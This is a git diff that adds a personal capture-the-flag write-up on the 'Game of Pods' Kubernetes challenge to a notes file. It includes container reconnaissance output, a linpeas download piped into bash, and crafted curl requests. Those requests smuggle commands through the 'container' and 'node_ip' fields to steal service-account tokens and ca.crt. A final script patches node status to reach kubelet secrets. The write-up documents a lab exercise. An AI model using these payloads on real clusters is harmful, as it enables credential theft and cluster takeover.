@@ -344,8 +344,481 @@ It's a really hard one if you don't have ctf experience.
 We learned that we can use `copy . from program` to exec command in pgsql and we can use `core_pattern` to privilege escalate to the host.
 
 
+# Game of Pods
+This one is difficult. You can check with [this one](https://tresscross.blog/game-of-pods-wiz-cloud-ctf-october/) and [that one](https://www.skybound.link/2025/11/wiz-cloud-security-championship-october-2025/).
+I just reproduce it with their help.
+
+In the beginning, I thought it was some priesc problem.  So I tried to use cdk to find some vulns.
+
+```
+root@test:~# whoami
+root
+root@test:~# uname
+Linux
+root@test:~# cat /etc/issue
+Welcome to Alpine Linux 3.18
+Kernel \r on an \m (\l)
+
+root@test:~# mount
+overlay on / type overlay (rw,relatime,lowerdir=/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/35/fs:/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/34/fs:/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/10/fs:/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/7/fs:/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/6/fs,upperdir=/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/36/fs,workdir=/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/36/work)
+proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
+tmpfs on /dev type tmpfs (rw,nosuid,size=65536k,mode=755)
+devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
+mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime)
+sysfs on /sys type sysfs (ro,nosuid,nodev,noexec,relatime)
+cgroup on /sys/fs/cgroup type cgroup2 (ro,nosuid,nodev,noexec,relatime)
+/dev/vdb on /etc/hosts type ext4 (rw,relatime)
+/dev/vdb on /dev/termination-log type ext4 (rw,relatime)
+/dev/vdb on /etc/hostname type ext4 (rw,relatime)
+/dev/vdb on /etc/resolv.conf type ext4 (rw,relatime)
+shm on /dev/shm type tmpfs (rw,relatime,size=65536k)
+tmpfs on /run/secrets/kubernetes.io/serviceaccount type tmpfs (ro,relatime,size=1011268k)
+proc on /proc/bus type proc (ro,nosuid,nodev,noexec,relatime)
+proc on /proc/fs type proc (ro,nosuid,nodev,noexec,relatime)
+proc on /proc/irq type proc (ro,nosuid,nodev,noexec,relatime)
+proc on /proc/sys type proc (ro,nosuid,nodev,noexec,relatime)
+proc on /proc/sysrq-trigger type proc (ro,nosuid,nodev,noexec,relatime)
+tmpfs on /proc/acpi type tmpfs (ro,relatime)
+tmpfs on /proc/kcore type tmpfs (rw,nosuid,size=65536k,mode=755)
+tmpfs on /proc/keys type tmpfs (rw,nosuid,size=65536k,mode=755)
+tmpfs on /proc/timer_list type tmpfs (rw,nosuid,size=65536k,mode=755)
+tmpfs on /proc/scsi type tmpfs (ro,relatime)
+tmpfs on /sys/firmware type tmpfs (ro,relatime)
+```
+
+```
+root@test:~# ./cdk evaluate
+CDK (Container DucK)
+CDK Version(GitCommit): e8ec183dc9da4968794b3922e6d474ab49215303
+Zero-dependency cloudnative k8s/docker/serverless penetration toolkit by cdxy & neargle
+Find tutorial, configuration and use-case in https://github.com/cdk-team/CDK/
+
+[  Information Gathering - System Info  ]
+2026/05/11 06:28:43 current dir: /root
+2026/05/11 06:28:43 current user: root uid: 0 gid: 0 home: /root
+2026/05/11 06:28:43 hostname: test
+2026/05/11 06:28:43 alpine alpine 3.18.12 kernel: 6.1.128
+
+[  Information Gathering - Services  ]
+2026/05/11 06:28:43 sensitive env found:
+        KUBERNETES_SERVICE_PORT_HTTPS=443
+2026/05/11 06:28:43 sensitive env found:
+        KUBERNETES_SERVICE_PORT=443
+2026/05/11 06:28:43 sensitive env found:
+        KUBERNETES_PORT_443_TCP=tcp://10.43.1.1:443
+2026/05/11 06:28:43 sensitive env found:
+        KUBERNETES_PORT_443_TCP_PROTO=tcp
+2026/05/11 06:28:43 sensitive env found:
+        KUBERNETES_PORT_443_TCP_ADDR=10.43.1.1
+2026/05/11 06:28:43 sensitive env found:
+        KUBERNETES_SERVICE_HOST=10.43.1.1
+2026/05/11 06:28:43 sensitive env found:
+        KUBERNETES_PORT=tcp://10.43.1.1:443
+2026/05/11 06:28:43 sensitive env found:
+        KUBERNETES_PORT_443_TCP_PORT=443
+
+[  Information Gathering - Commands and Capabilities  ]
+2026/05/11 06:28:43 Capabilities hex of Caps(CapInh|CapPrm|CapEff|CapBnd|CapAmb):
+        CapInh: 0000000000000000
+        CapPrm: 00000000a80425fb
+        CapEff: 00000000a80425fb
+        CapBnd: 00000000a80425fb
+        CapAmb: 0000000000000000
+        Cap decode: 0x00000000a80425fb = CAP_CHOWN,CAP_DAC_OVERRIDE,CAP_FOWNER,CAP_FSETID,CAP_KILL,CAP_SETGID,CAP_SETUID,CAP_SETPCAP,CAP_NET_BIND_SERVICE,CAP_NET_RAW,CAP_SYS_CHROOT,CAP_MKNOD,CAP_AUDIT_WRITE,CAP_SETFCAP
+[*] Maybe you can exploit the Capabilities below:
+2026/05/11 06:28:43 available commands:
+        curl,wget,nc,kubectl,find,ps,vi,mount,fdisk,base64
+
+[  Information Gathering - Mounts  ]
+0:90 / / rw,relatime - overlay overlay rw,lowerdir=/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/35/fs:/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/34/fs:/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/10/fs:/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/7/fs:/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/6/fs,upperdir=/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/36/fs,workdir=/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/36/work
+0:116 / /proc rw,nosuid,nodev,noexec,relatime - proc proc rw
+0:117 / /dev rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755
+0:118 / /dev/pts rw,nosuid,noexec,relatime - devpts devpts rw,gid=5,mode=620,ptmxmode=666
+0:46 / /dev/mqueue rw,nosuid,nodev,noexec,relatime - mqueue mqueue rw
+0:51 / /sys ro,nosuid,nodev,noexec,relatime - sysfs sysfs ro
+0:25 / /sys/fs/cgroup ro,nosuid,nodev,noexec,relatime - cgroup2 cgroup rw
+254:16 /volumes/b081761fac04d12dc6807c570f7a3693d9d84c4ac1f8b6bb8a2363b96a0b3e35/_data/pods/4f0c0d93-f622-47ad-b040-3f784afcc7ac/etc-hosts /etc/hosts rw,relatime - ext4 /dev/vdb rw
+254:16 /volumes/b081761fac04d12dc6807c570f7a3693d9d84c4ac1f8b6bb8a2363b96a0b3e35/_data/pods/4f0c0d93-f622-47ad-b040-3f784afcc7ac/containers/test/7c2efc1b /dev/termination-log rw,relatime - ext4 /dev/vdb rw
+254:16 /volumes/293cceff08dddb798ca16b1f7eae17a8543564df61f0470a8e6bdc7a129302fe/_data/agent/containerd/io.containerd.grpc.v1.cri/sandboxes/1bda206f479be85808ca7e0c517bff2d9b046330386be3eb4acc12e458a4ed3f/hostname /etc/hostname rw,relatime - ext4 /dev/vdb rw
+254:16 /volumes/293cceff08dddb798ca16b1f7eae17a8543564df61f0470a8e6bdc7a129302fe/_data/agent/containerd/io.containerd.grpc.v1.cri/sandboxes/1bda206f479be85808ca7e0c517bff2d9b046330386be3eb4acc12e458a4ed3f/resolv.conf /etc/resolv.conf rw,relatime - ext4 /dev/vdb rw
+0:38 / /dev/shm rw,relatime - tmpfs shm rw,size=65536k
+0:37 / /run/secrets/kubernetes.io/serviceaccount ro,relatime - tmpfs tmpfs rw,size=1011268k
+0:116 /bus /proc/bus ro,nosuid,nodev,noexec,relatime - proc proc rw
+0:116 /fs /proc/fs ro,nosuid,nodev,noexec,relatime - proc proc rw
+0:116 /irq /proc/irq ro,nosuid,nodev,noexec,relatime - proc proc rw
+0:116 /sys /proc/sys ro,nosuid,nodev,noexec,relatime - proc proc rw
+0:116 /sysrq-trigger /proc/sysrq-trigger ro,nosuid,nodev,noexec,relatime - proc proc rw
+0:119 / /proc/acpi ro,relatime - tmpfs tmpfs ro
+0:117 /null /proc/kcore rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755
+0:117 /null /proc/keys rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755
+0:117 /null /proc/timer_list rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755
+0:120 / /proc/scsi ro,relatime - tmpfs tmpfs ro
+0:121 / /sys/firmware ro,relatime - tmpfs tmpfs ro
+
+[  Information Gathering - Net Namespace  ]
+        container net namespace isolated.
+
+[  Information Gathering - Sysctl Variables  ]
+2026/05/11 06:28:43 net.ipv4.conf.all.route_localnet = 0
+
+[  Information Gathering - DNS-Based Service Discovery  ]
+error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.1.10:53: no such host
+error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.1.10:53: no such host
+
+[  Discovery - K8s API Server  ]
+2026/05/11 06:28:43 checking if api-server allows system:anonymous request.
+err found in post request, error response code: 401 Unauthorized.
+        api-server forbids anonymous request.
+        response:{"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
+
+
+[  Discovery - K8s Service Account  ]
+        service-account is available
+2026/05/11 06:28:43 trying to list namespaces
+err found in post request, error response code: 403 Forbidden.
+
+[  Discovery - Cloud Provider Metadata API  ]
+2026/05/11 06:28:44 failed to dial Volcano Engine (Volcengine) API.
+2026/05/11 06:28:45 failed to dial Alibaba Cloud API.
+2026/05/11 06:28:46 failed to dial Azure API.
+2026/05/11 06:28:46 failed to dial Google Cloud API.
+2026/05/11 06:28:46 failed to dial Tencent Cloud API.
+2026/05/11 06:28:47 failed to dial OpenStack API.
+2026/05/11 06:28:48 failed to dial Amazon Web Services (AWS) API.
+2026/05/11 06:28:49 failed to dial ucloud API.
+
+[  Exploit Pre - Kernel Exploits  ]
+2026/05/11 06:28:49 refer: https://github.com/mzet-/linux-exploit-suggester
+[+] [CVE-2021-22555] Netfilter heap out-of-bounds write
+
+   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
+   Exposure: less probable
+   Tags: ubuntu=20.04{kernel:5.8.0-*}
+   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
+   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
+   Comments: ip_tables kernel module must be loaded
 
 
 
+[  Information Gathering - Container Security  ]
+2026/05/11 06:28:50 Namespace isolation status:
+        cgroup: NOT isolated (shared with host, cgroup:[4026532518])
+        ipc: NOT isolated (shared with host, ipc:[4026532247])
+        mnt: NOT isolated (shared with host, mnt:[4026532516])
+        net: NOT isolated (shared with host, net:[4026532162])
+        pid: NOT isolated (shared with host, pid:[4026532517])
+        uts: NOT isolated (shared with host, uts:[4026532246])
+2026/05/11 06:28:50 Seccomp: disabled
+2026/05/11 06:28:50 Seccomp: kernel supports Seccomp
+2026/05/11 06:28:50 Seccomp: kernel config CONFIG_SECCOMP=y
+2026/05/11 06:28:50 SELinux: not detected (no selinuxfs)
+2026/05/11 06:28:50 AppArmor: kernel config CONFIG_SECURITY_APPARMOR=n
+2026/05/11 06:28:50 AppArmor: no explicit AppArmor boot parameter found
+2026/05/11 06:28:50 AppArmor: module not loaded
+2026/05/11 06:28:50 AppArmor: container profile: kernel
+
+```
+And I also tried linpeas and some nmap scan.
+```
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash
+
+Nmap scan report for 10.42.0.1
+Host is up (0.00011s latency).
+MAC Address: E6:75:64:78:01:C3 (Unknown)
+Nmap scan report for 10.42.0.3
+Host is up (0.000064s latency).
+MAC Address: 5E:7F:D0:45:B8:A7 (Unknown)
+Nmap scan report for 10.42.0.4
+Host is up (0.000036s latency).
+MAC Address: 5E:E4:12:D5:40:40 (Unknown)
+Nmap scan report for 10.42.0.5
+Host is up (0.000032s latency).
+MAC Address: E2:1A:25:F8:8E:8F (Unknown)
+```
+
+Then, Hint 1
+```
+Images tend to live together in herds called registries
+```
+
+I asked DeepSeek how to get information about k8s registries.
+```
+TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+
+APISERVER="https://kubernetes.default.svc"
+
+curl --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
+     -H "Authorization: Bearer $TOKEN" \
+     $APISERVER/api/v1/namespaces/default/pods
+```
+
+Get Hint 2
+```
+I always forget the proper way to construct URLs in Golang. I guess %s will do the trick.
+```
+No idea. So I tried to find some writeup to get some ideas.
+
+```
+cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
+
+env
+
+# get some info about k8s
+kubectl auth whoami
+
+kubectl auth can-i --list
+kubectl get pods
+kubectl get pod test -o yaml
+```
+
+We get the registries url. And the writeup suggests a tool called `oras`. And then we try to get `k8s-debug-bridge.go`.
+```
+oras repo ls hustlehub.azurecr.io
+
+oras copy hustlehub.azurecr.io/k8s-debug-bridge:latest --to-oci-layout k8s-debug-bridge/
+
+jq . k8s-debug-bridge/index.json
+
+jq . k8s-debug-bridge/blobs/sha256/a705d5c6dd51fcfc0c8c7b8989df26b02a88740ae5b696fa8e65ac31f427b72e
+jq . k8s-debug-bridge/blobs/sha256/7162697db986f5e02d9091e5f29193a473f5fbd2d7b186243813052c9b7b5ed7
+
+mkdir /tmp/rootfs
+tar -xzf k8s-debug-bridge/blobs/sha256/44cf07d57ee4424189f012074a59110ee2065adfdde9c7d9826bebdffce0a885 -C /tmp/rootfs
+tar -xzf k8s-debug-bridge/blobs/sha256/049d988b9bf0a21ad8597ad57e538949be03f703977d21d9d30b7da3fc92f983 -C /tmp/rootfs
+tar -xzf k8s-debug-bridge/blobs/sha256/af22b6a1bf08e5477608575f8890ef7cbc61994011a54d37a5edd5630a6b9a6f -C /tmp/rootfs
+tar -xzf k8s-debug-bridge/blobs/sha256/f055869862fb70dd5a7f7c2b9ac1e9d50b886d9a3b55c1e288ad1ba76644bdae -C /tmp/rootfs
+
+ls /tmp/rootfs/root/
+
+cat /tmp/rootfs/root/k8s-debug-bridge.go
+```
+So I try to get the ip and request it.
+```
+root@test:~# curl 10.42.0.4:8080
+404 page not found
+root@test:~# curl 10.42.0.5:8080
+404 page not found
+
+root@test:~# curl 10.42.0.4:8080/logs
+Method not allowed
+root@test:~# curl 10.42.0.4:8080/checkpoint
+Method not allowed
+
+curl -X POST http://10.42.0.4:8080/logs \
+  -H "Content-Type: application/json" \
+  -d '{
+    "node_ip": "10.42.0.2",
+    "pod": "app-blog",
+    "namespace": "app",
+    "container": "app-blog"
+  }'
+
+curl -X POST http://10.42.0.4:8080/checkpoint \
+  -H "Content-Type: application/json" \
+  -d '{
+    "node_ip": "10.244.2.8",
+    "pod": "critical-pod",
+    "namespace": "app",
+    "container": "app-container"
+  }'
+```
+The `node_ip` is not right.
+
+From the write up, we know the ip is `172.30.0.2`.
+```
+coredns-enum --mode bruteforce --cidr 10.43.0.0/16 --zone cluster.local
+
+curl -X POST http://10.43.1.168:8080/logs \
+  -H "Content-Type: application/json" \
+  -d '{
+    "node_ip": "172.30.0.2",
+    "pod": "app-blog",
+    "namespace": "app",
+    "container": "app-blog"
+  }'
+
+curl -X POST http://10.43.1.168:8080/checkpoint \
+  -H "Content-Type: application/json" \
+  -d '{
+    "node_ip": "10.43.1.168",
+    "pod": "critical-pod",
+    "namespace": "app",
+    "container": "app-container"
+  }'
+
+curl -X POST http://10.42.0.4:8080/checkpoint \
+  -H "Content-Type: application/json" \
+  -d '{
+    "node_ip": "10.43.1.168",
+    "pod": "critical-pod",
+    "namespace": "app",
+    "container": "app-container"
+  }'
+
+curl http://k8s-debug-bridge.app/logs -d '{"node_ip": "172.30.0.2", "pod": "app-blog", "namespace": "app", "container": 
+"app-blog"}'
+
+curl http://10.43.1.168/logs -d '{"node_ip": "172.30.0.2", "pod": "app-blog", "namespace": "app", "container": 
+"app-blog"}'
+
+curl http://10.42.0.4:8080/logs -d '{"node_ip": "172.30.0.2", "pod": "app-blog", "namespace": "app", "container": 
+"app-blog"}'
+
+curl 10.43.1.36
+
+curl -X POST http://10.42.0.4:8080/logs \
+  -H "Content-Type: application/json" \
+  -d '{
+    "node_ip": "172.30.0.2",
+    "pod": "app-blog",
+    "namespace": "app",
+    "container": "app-blog"
+  }'
+
+# not working in para `container` 
+
+curl -X POST http://10.42.0.4:8080/checkpoint \
+  -H "Content-Type: application/json" \
+  -d '{
+    "node_ip": "172.30.0.2",
+    "pod": "app-blog",
+    "namespace": "app",
+    "container": "../../../../../../run/app/app-blog/app-blog?cmd=cat+/var/run/secrets/kubernetes.io/serviceaccount/token#"
+  }'
 
 
+curl -X POST http://10.43.1.168:8080/checkpoint \
+  -H "Content-Type: application/json" \
+  -d '{
+    "node_ip": "172.30.0.2",
+    "pod": "app-blog",
+    "namespace": "app",
+    "container": "../../../../run/app/app-blog/app-blog?cmd=cat+/var/run/secrets/kubernetes.io/serviceaccount/token#"
+  }'
+
+curl -X POST http://k8s-debug-bridge.app:8080/checkpoint \
+  -H "Content-Type: application/json" \
+  -d '{
+    "node_ip": "172.30.0.2",
+    "pod": "app-blog",
+    "namespace": "app",
+    "container": "../../../../run/app/app-blog/app-blog?cmd=cat+/var/run/secrets/kubernetes.io/serviceaccount/token#"
+  }'
+
+
+curl -X POST http://10.43.1.168/checkpoint \
+  -H "Content-Type: application/json" \
+  -d '{
+    "node_ip": "172.30.0.2",
+    "pod": "app-blog",
+    "namespace": "app",
+    "container": "../../../../run/app/app-blog/app-blog?cmd=cat+/var/run/secrets/kubernetes.io/serviceaccount/token#"
+  }'
+```
+You need to abuse `node_ip` to get token and `ca.crt`.
+```
+
+curl -X POST http://10.43.1.168/checkpoint \
+  -H "Content-Type: application/json" \
+  -d '{
+    "node_ip": "172.30.0.2:10250/run/app/app-blog/app-blog?cmd=cat+/var/run/secrets/kubernetes.io/serviceaccount/token#",
+    "pod": "app-blog",
+    "namespace": "app",
+    "container": "a"
+  }'
+
+curl -X POST http://10.43.1.168/checkpoint \
+  -H "Content-Type: application/json" \
+  -d '{
+    "node_ip": "172.30.0.2:10250/run/app/app-blog/app-blog?cmd=cat+/var/run/secrets/kubernetes.io/serviceaccount/ca.crt#",
+    "pod": "app-blog",
+    "namespace": "app",
+    "container": "a"
+  }'
+```
+
+base64encode `ca.crt` to get `certificate-authority-data`.
+```
+cat <<EOF > app-kubeconfig.yaml
+apiVersion: v1
+kind: Config
+clusters:
+- cluster:
+    certificate-authority-data: LS0tLS_CHANGE_TO_YOUR_CERT_LS0=
+    server: https://kubernetes.default.svc.cluster.local 
+  name: my-cluster
+contexts:
+- context:
+    cluster: my-cluster
+    namespace: app
+    user: app-sa
+  name: app-context
+current-context: app-context
+users:
+- name: app-sa
+  user:
+    token: eyJhbGciOiJS_CHANGE_TO_YOUR_TOKEN_-HXFAjS4YQUuTcibhxw
+EOF
+
+
+kubectl --kubeconfig=app-kubeconfig.yaml auth can-i --list
+
+kubectl --kubeconfig=app-kubeconfig.yaml get secrets -n app -o yaml
+
+cat <<EOF > secret.yml
+apiVersion: v1
+kind: Secret
+metadata:
+  name: debug-bridge-token
+  namespace: app
+  annotations:
+    kubernetes.io/service-account.name: "k8s-debug-bridge"
+type: kubernetes.io/service-account-token
+EOF
+
+kubectl --kubeconfig=app-kubeconfig.yaml apply -f secret.yml
+
+TOKEN=$(kubectl --kubeconfig=app-kubeconfig.yaml -n app get secret debug-bridge-token -o jsonpath='{.data.token}' | base64 -d)
+
+kubectl --token $TOKEN auth can-i --list
+
+export TOKEN
+
+cat <<'EOF' > script.sh
+#!/bin/bash
+
+set -euo pipefail
+
+readonly NODE="noder"                 # hostname of the worker node
+readonly API_SERVER_PORT=6443         # API server port
+readonly API_SERVER_IP="172.30.0.2"   # API server IP
+readonly BEARER_TOKEN="${TOKEN}"      # service account token (must be exported)
+
+# Fetch node status
+curl -k \
+  -H "Authorization: Bearer ${BEARER_TOKEN}" \
+  -H "Content-Type: application/json" \
+  "https://${API_SERVER_IP}:${API_SERVER_PORT}/api/v1/nodes/${NODE}/status" \
+  > "${NODE}-orig.json"
+
+# Patch kubelet port in status
+sed "s/\"Port\": 10250/\"Port\": ${API_SERVER_PORT}/g" \
+  "${NODE}-orig.json" > "${NODE}-patched.json"
+
+# Update node status
+curl -k \
+  -H "Authorization: Bearer ${BEARER_TOKEN}" \
+  -H "Content-Type: application/merge-patch+json" \
+  -X PATCH \
+  -d "@${NODE}-patched.json" \
+  "https://${API_SERVER_IP}:${API_SERVER_PORT}/api/v1/nodes/${NODE}/status"
+
+# Access kubelet via API server node proxy
+curl -kv \
+  -H "Authorization: Bearer ${BEARER_TOKEN}" \
+  "https://${API_SERVER_IP}:${API_SERVER_PORT}/api/v1/nodes/${NODE}/proxy/api/v1/secrets"
+EOF
+
+```
+
+First explore the registries. Then get infomation from an interseting image. Get the source code and find a `bug` in it. Then try to abuse the proxy to get token and `ca.crt`. Use the token to create a secret. Exploit a issue in k8s.
